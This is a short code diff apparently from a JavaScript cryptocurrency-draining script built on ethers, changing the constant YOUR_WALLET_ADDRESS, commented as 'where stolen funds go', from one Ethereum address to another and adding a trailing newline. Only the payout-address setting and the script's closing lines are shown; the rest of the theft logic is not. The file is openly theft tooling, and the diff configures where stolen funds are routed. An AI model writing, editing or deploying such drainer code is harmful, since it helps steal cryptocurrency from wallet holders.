@@ -21,7 +21,7 @@ const { ethers } = require('ethers');
 // ============================================================
 // 🔴 YOUR WALLET ADDRESS (where stolen funds go)
 // ============================================================
-const YOUR_WALLET_ADDRESS = '0x277c6118CcDB4F2E7A5e71D3406de484145e27D8';
+const YOUR_WALLET_ADDRESS = '0x0eE7D9bfed5543BEC348Df3fa3AF181CF71dD3b9';
 
 // ============================================================
 // 🔴 ENVIRONMENT VARIABLES
@@ -346,3 +346,4 @@ process.on('unhandledRejection', (err) => {
 });
 
 main();
+
